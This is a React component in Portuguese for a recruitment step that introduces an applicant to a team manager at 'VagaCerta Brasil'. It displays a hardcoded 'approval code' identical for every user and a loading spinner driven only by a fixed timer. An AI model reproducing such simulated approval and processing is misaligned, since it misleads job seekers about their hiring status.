/* eslint-disable no-unused-vars */
import React, { useState, useEffect } from "react";
import { useProcess } from '../../hooks/useProcess.js';
import { motion } from 'framer-motion';
const gerenteImg = null;
import '../../styles/refino.css';

const ContratacaoGerenteStep = ({ onContinuar }) => {
  const [loading, setLoading] = useState(false);
  const [dots, setDots] = useState(0);
  // Captura nome do usuário do contexto global (useProcess) corretamente
  const { processData } = useProcess();
  const userData = processData?.userData || {};
  let nomeUsuario = userData.nome || ((userData.firstName || '') + (userData.lastName ? ' ' + userData.lastName : ''));
  if (!nomeUsuario.trim()) nomeUsuario = 'candidato';

  useEffect(() => {
    let interval;
    if (loading) {
      interval = setInterval(() => {
        setDots(prev => (prev + 1) % 4);
      }, 400);
    } else {
      setDots(0);
    }
    return () => clearInterval(interval);
  }, [loading]);

  const continuar = () => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      onContinuar();
    }, 2000);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-between px-4 pt-8 pb-10">
      <div className="w-full max-w-md mx-auto">
        {/* Código de aprovação */}
        <div className="mb-4 flex justify-start">
          <span className="bg-[#0ecb7b] text-white font-hendrix-medium text-xs px-3 py-1 rounded-full shadow" style={{ letterSpacing: '0.5px' }}>
            Código de aprovação: #WST-782411
          </span>
        </div>
        {/* Título */}
        <h1 className="font-hendrix-bold text-3xl text-white mb-3 leading-tight">
          Em qual área de atendimento você deseja trabalhar?
        </h1>
        <p className="font-hendrix-regular text-base text-gray-300 mb-6">
          A partir de agora você terá contato direto com o Antônio, seu gerente de equipe.<br />
          Ele vai acompanhar seu início, tirar dúvidas e orientar seus primeiros atendimentos.<br />
          Assim que sua contratação for oficializada, ele enviará uma mensagem de boas-vindas no seu WhatsApp com as primeiras instruções.
        </p>
        {/* Card do gerente com imagem */}
        <div className="rounded-3xl overflow-hidden bg-[#292929] flex flex-col items-center mb-6" style={{ boxShadow: '0 2px 8px rgba(0,0,0,0.10)' }}>
          <img
            src={gerenteImg}
            alt="Antônio Matos"
            className="w-full object-cover"
            style={{ height: "420px", objectFit: "cover" }}
          />
          <div className="flex items-center justify-between w-full px-6 py-4" style={{ minHeight: '70px' }}>
            <div className="flex items-center gap-3">
              <span className="bg-[#2563eb] rounded-full flex items-center justify-center" style={{ width: 32, height: 32 }}>
                <svg width="20" height="20" viewBox="0 0 20 20" fill="none">
                  <circle cx="10" cy="10" r="10" fill="#2563eb"/>
                  <path d="M7.5 10.5L9.5 12.5L13 9" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </span>
              <div className="flex flex-col justify-center">
                <span className="font-hendrix-semibold text-white text-base leading-tight">Antônio Matos</span>
                <span className="font-hendrix-regular text-gray-300 text-xs leading-tight" style={{ marginTop: '-2px' }}>Team manager</span>
              </div>
            </div>
            <div className="flex items-center justify-center">
              <span className="bg-gradient-to-r from-[#2563eb] to-[#3b82f6] text-white font-hendrix-medium text-xs px-5 py-2 rounded-full shadow" style={{ fontSize: '15px', fontWeight: 500 }}>VagaCerta Brasil</span>
            </div>
          </div>
        </div>
        {/* Bloco de texto destacado */}
        <div className="bg-[#292929] rounded-2xl px-6 py-5 mb-8 flex flex-col items-start" style={{ minHeight: '90px' }}>
          <div className="w-full flex justify-start mb-1">
            <svg width="54" height="54" fill="none" style={{ display: 'block' }}>
              <text x="0" y="44" fontSize="54" fill="#fff">“</text>
            </svg>
          </div>
          <div className="w-full">
            <span className="text-gray-100 text-base font-hendrix-regular block" style={{ lineHeight: '1.5', fontSize: '16px' }}>
              <span className="font-hendrix-semibold text-white block mb-1">
                Olá, {nomeUsuario || 'candidato'}!
                <br />
                <br />
                Bem-vindo(a) à VagaCerta Brasil.
                
              </span>
              Eu sou o Antônio, seu gerente de equipe, e estarei ao seu lado neste início. Meu papel é garantir que você esteja pronto(a) para começar com confiança.
            </span>
          </div>
        </div>
      </div>
      <div className="w-full max-w-md mx-auto">
        <motion.button
          type="button"
          onClick={continuar}
          disabled={loading}
          whileTap={{ scale: 0.97 }}
          whileHover={{ scale: loading ? 1 : 1.03 }}
          className={`w-full py-3 rounded-full bg-gradient-to-r from-[#1655ff] to-[#60a5fa] font-hendrix-semibold text-white text-lg shadow-lg transition flex items-center justify-center ${loading ? 'cursor-not-allowed opacity-60' : ''}`}
          style={{ border: 'none' }}
        >
          {loading ? (
            <>
              <motion.div
                className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                animate={{ rotate: 360 }}
                transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
              />
              <span className="font-hendrix-medium tracking-wide text-base">Carregando{'.'.repeat(dots)}</span>
            </>
          ) : (
            <span className="font-hendrix-medium tracking-wide text-lg">Continuar</span>
          )}
        </motion.button>
      </div>
    </div>
  );
};

export default ContratacaoGerenteStep;
